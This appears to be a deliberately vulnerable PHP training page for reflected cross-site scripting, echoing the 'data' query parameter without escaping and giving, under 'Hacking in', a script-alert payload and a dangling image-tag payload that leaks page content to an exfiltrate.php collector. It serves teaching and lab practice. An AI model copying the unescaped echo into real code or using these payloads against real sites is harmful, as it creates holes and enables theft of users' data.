<!DOCTYPE html>
<html>
  <head>
    <title>Reflected XSS</title>
  </head>
  <body>
    <h1>Reflected XSS</h1>
<?php if (array_key_exists('data', $_GET)): ?>
    <h2>You said:</h2>
    <p><?php echo $_GET['data']; ?></p>
<?php endif; ?>
    <h2>Say something:</h2>
    <form action="index.php" method="get">
      <input type="text" name="data"/><input type="submit"/>
    </form>
    <h2>How to use</h2>
    <p>
      Enter something in the box above.
      The application will echo it back.
    </p>
    <h3>Hacking in</h3>
    <p>Enter the following:</p>
    <p><pre>&lt;script&gt;alert(&quot;Pwned&quot;);&lt;/script&gt;</pre></p>
    <p>Alternatively, try exfiltrating some content:</p>
    <p><pre>&lt;img src=&quot;exfiltrate.php?data=</pre></p>
    <p>Visit <a href="exfiltrate.php">exfiltrate.php</a> to view stolen data.</p>
    <p><a href="index.php">Reset</a></p>
  </body>
</html>
